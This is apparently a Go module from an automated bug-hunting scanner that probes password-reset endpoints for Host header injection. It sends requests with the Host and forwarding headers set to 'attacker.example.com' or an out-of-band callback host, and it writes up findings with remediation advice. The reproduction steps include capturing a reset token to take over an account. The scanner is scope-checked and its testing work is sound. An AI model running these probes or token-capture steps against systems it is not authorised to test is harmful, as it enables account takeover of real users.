package scanner

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"sort"
	"strings"

	"auto-bughunter/backend/internal/model"
	"auto-bughunter/backend/internal/oast"
	"auto-bughunter/backend/internal/scope"
)

// hostHeaderBodyLimit caps the per-response read during host-header probing.
const hostHeaderBodyLimit = 64 * 1024

// passwordResetPaths are conventional paths for password-reset/account-recovery
// flows. These are the highest-value targets for Host header injection because
// the application typically emails a link constructed from the Host header.
var passwordResetPaths = []string{
	"/password-reset",
	"/forgot-password",
	"/reset-password",
	"/account/recover",
	"/auth/reset",
	"/api/auth/reset",
	"/api/password/reset",
	"/users/password",
	"/user/reset-password",
}

// hostHeaderResponsePattern detects common server-side error / rejection signals
// that indicate the server refused the poisoned host value.
var hostHeaderResponsePattern = regexp.MustCompile(
	`(?i)(bad request|invalid host|host not allowed|forbidden)`,
)

// RunHostHeaderInjectionProbe is an active probe that injects a poisoned Host
// header into password-reset initiation requests. When the application reflects
// the Host header value in the emailed reset link an attacker can deliver a
// poisoned link that causes the victim to send a valid reset token to an
// attacker-controlled server (Host header injection → password-reset poisoning).
//
// The probe uses the OAST service to receive the OOB callback: a callback
// proves the server made an outbound request to the attacker domain, confirming
// the injection is server-side. If no OAST service is configured the probe
// falls back to a passive response-inspection approach.
func (s *Service) RunHostHeaderInjectionProbe(
	ctx context.Context,
	target string,
	scanScope model.ScanScope,
	options model.ScanOptions,
	auth model.ScanAuthProfile,
	oastSvc *oast.Service,
	emit func(model.ScanEvent),
) []model.Finding {
	if options.PassiveOnly {
		return nil
	}

	base, err := url.Parse(strings.TrimSpace(target))
	if err != nil || base.Scheme == "" || base.Host == "" {
		return nil
	}

	candidates := hostHeaderCandidates(base, options.SeedRuntimeEndpoints, scanScope)
	if len(candidates) == 0 {
		return nil
	}

	if emit != nil {
		emit(model.ScanEvent{
			Type:    model.ScanEventCommand,
			Command: fmt.Sprintf("host-header-injection %s", target),
			Message: fmt.Sprintf("Probing %d password-reset endpoints for Host header injection", len(candidates)),
		})
	}

	poisonHost := "attacker.example.com"
	var oastToken string
	if oastSvc != nil {
		tok := oastSvc.Issue("", "host-header-injection")
		if tok.CallbackURL != "" {
			if u, err2 := url.Parse(tok.CallbackURL); err2 == nil && u.Host != "" {
				poisonHost = u.Host
				oastToken = tok.Token
			}
		}
	}

	var findings []model.Finding
	emitted := map[string]bool{}

	for _, ep := range candidates {
		fid := "host-header-injection-" + hhSlug(ep)
		if emitted[fid] {
			continue
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, ep, nil)
		if err != nil {
			continue
		}
		ApplyAuthProfile(req, auth)

		// Inject the poisoned Host header. We also set X-Forwarded-Host and
		// X-Host as they are commonly used as host fallbacks.
		req.Host = poisonHost
		req.Header.Set("X-Forwarded-Host", poisonHost)
		req.Header.Set("X-Host", poisonHost)
		req.Header.Set("X-Original-URL", "//"+poisonHost+"/reset")
		req.Header.Set("Content-Type", "application/json")

		resp, err := s.doRequestWithRetry(ctx, req, options)
		if err != nil || resp == nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, hostHeaderBodyLimit))
		_ = resp.Body.Close()

		// If the server rejected the host explicitly, skip.
		if hostHeaderResponsePattern.Match(body) {
			continue
		}

		// Confirm via OAST callback if available.
		oastConfirmed := false
		if oastSvc != nil && oastToken != "" {
			if hits, ok := oastSvc.Hits(oastToken); ok && len(hits) > 0 {
				oastConfirmed = true
			}
		}

		// Heuristic: the response reflects the poison host or the response
		// succeeds (2xx/302) without explicit rejection on a reset endpoint.
		bodyStr := string(body)
		reflected := strings.Contains(bodyStr, poisonHost)
		accepted := is2xxOrRedirect(resp.StatusCode) && !hostHeaderResponsePattern.Match(body)

		if !reflected && !accepted && !oastConfirmed {
			continue
		}

		emitted[fid] = true

		confidence := 0.70
		evidence := fmt.Sprintf(
			"POST %s with Host: %s returned HTTP %d",
			ep, poisonHost, resp.StatusCode,
		)
		if reflected {
			evidence += fmt.Sprintf("; poison host %q reflected in response body", poisonHost)
			confidence = 0.88
		}
		if oastConfirmed {
			evidence += fmt.Sprintf("; OOB callback received from server to %q — confirmed server-side injection", poisonHost)
			confidence = 0.95
		}

		findings = append(findings, model.Finding{
			ID:       fid,
			Category: "injection",
			Severity: model.SeverityHigh,
			Title:    "Host header injection on password-reset flow",
			Description: "The password-reset endpoint accepted a request with a poisoned Host header " +
				"(and/or X-Forwarded-Host) without rejecting the manipulated value. " +
				"When the application uses the Host header to construct the reset link that is emailed to users, " +
				"an attacker can trigger a password-reset for a victim account and intercept the reset token " +
				"by controlling the link destination. This leads to full account takeover.",
			Evidence: evidence,
			Recommendation: "Never use the HTTP Host header to construct URLs in security-sensitive flows. " +
				"Use a hard-coded base URL from server-side configuration. " +
				"Validate the Host header against an allowlist of expected domain names before using it. " +
				"Configure your web server to reject requests with unexpected Host values.",
			Confidence:    confidence,
			AffectedURL:   ep,
			CWE:           "CWE-644",
			OWASPCategory: "A03:2021 - Injection",
			Sources:       []string{"active-scanner", "host-header-injection"},
			ReproductionSteps: []string{
				fmt.Sprintf("Send POST %s with header: Host: %s", ep, poisonHost),
				"Also include X-Forwarded-Host: " + poisonHost,
				"Trigger a password-reset for a test account.",
				fmt.Sprintf("Check whether the reset email contains a link to %q instead of the legitimate domain.", poisonHost),
				"If the link points to the attacker domain, capture the reset token and use it to take over the account.",
			},
			BusinessTags: []string{"host-header-injection", "password-reset", "account-takeover"},
			EvidenceFields: map[string]string{
				"validationType": "active-probe",
				"poisonHost":     poisonHost,
				"oastConfirmed":  fmt.Sprintf("%t", oastConfirmed),
				"reflected":      fmt.Sprintf("%t", reflected),
				"responseStatus": fmt.Sprintf("%d", resp.StatusCode),
			},
		})
	}

	sort.Slice(findings, func(i, j int) bool { return findings[i].ID < findings[j].ID })
	return findings
}

// hostHeaderCandidates collects candidate password-reset/account-recovery endpoints.
func hostHeaderCandidates(base *url.URL, seeded []string, scanScope model.ScanScope) []string {
	out := make([]string, 0)
	seen := map[string]struct{}{}

	for _, path := range passwordResetPaths {
		ref, err := url.Parse(path)
		if err != nil {
			continue
		}
		ep := base.ResolveReference(ref).String()
		if _, ok := seen[ep]; ok {
			continue
		}
		if !scope.IsURLInScope(ep, scanScope) {
			continue
		}
		seen[ep] = struct{}{}
		out = append(out, ep)
	}

	for _, s := range seeded {
		s = strings.TrimSpace(s)
		if s == "" {
			continue
		}
		lower := strings.ToLower(s)
		if strings.Contains(lower, "reset") || strings.Contains(lower, "forgot") ||
			strings.Contains(lower, "recover") || strings.Contains(lower, "password") {
			if _, ok := seen[s]; ok {
				continue
			}
			if !scope.IsURLInScope(s, scanScope) {
				continue
			}
			seen[s] = struct{}{}
			out = append(out, s)
		}
	}

	return out
}

func hhSlug(rawURL string) string {
	var b strings.Builder
	for _, r := range strings.ToLower(rawURL) {
		if (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') {
			b.WriteRune(r)
		} else {
			b.WriteRune('-')
		}
	}
	s := strings.Trim(b.String(), "-")
	if len(s) > 40 {
		s = s[len(s)-40:]
	}
	return strings.Trim(s, "-")
}
